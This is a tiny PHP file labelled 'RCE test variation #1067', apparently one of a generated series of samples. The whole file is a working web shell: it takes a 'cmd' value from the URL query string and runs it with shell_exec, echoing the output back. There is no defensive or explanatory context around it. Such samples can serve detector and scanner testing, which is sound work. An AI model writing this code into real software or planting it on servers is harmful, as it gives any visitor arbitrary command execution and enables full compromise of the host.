<?php
// RCE test variation #1067
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>